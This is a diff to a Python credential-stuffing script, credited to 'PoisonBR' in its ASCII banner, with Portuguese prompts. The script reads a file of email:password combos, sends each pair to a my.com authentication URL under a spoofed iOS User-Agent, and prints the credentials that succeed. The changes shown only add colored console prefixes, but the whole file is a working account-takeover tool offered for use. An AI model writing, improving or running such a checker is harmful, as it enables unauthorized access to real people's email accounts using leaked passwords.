@@ -1,6 +1,7 @@
 import requests, time, os
 
 R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
+EG=f'{C}[{G}!{C}]'; MG=f'{C}[{G}+{C}]'; MR=f'{C}[{R}-{C}]'; AG=f'{C}[{G}*{C}]'; IG=f'{C}[{G}i{C}]'
 
 os.system('git pull && clear')
 
@@ -55,16 +56,16 @@ print(f'''{B}*By PoisonBR
 {B}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝{C}╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ {G}v1.0{C}
 ''')
 
-db=open(input('Indique o caminho do arquivo: '), 'r').read().splitlines()
+db=open(input(f'{MG}Indique o caminho do arquivo: {B}'), 'r').read().splitlines()
 print(G+str(len(db))+C+' e-mails no arquivo.'); time.sleep(3)
-print('Testando credenciais, aguarde...')
+print(f'{AG}Testando credenciais, aguarde...')
 ldb=len(db)
 
 def checker(email, senha, c, ldb):
     acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
     if ('Ok=1') in acesso:
-        print('Credenciais válidas: '+combo)
-        print('E-mails verificados: '+str(c)+', e-mails restantes: '+str(ldb-c))
+        print(f'{EG}{G}Credenciais válidas: {C}'+combo)
+        print(f'{IG}E-mails verificados: {G}'+str(c)+C+', e-mails restantes: '+G+str(ldb-c)+C)
 c=0        
 for combo in db:
   if (':') in combo:
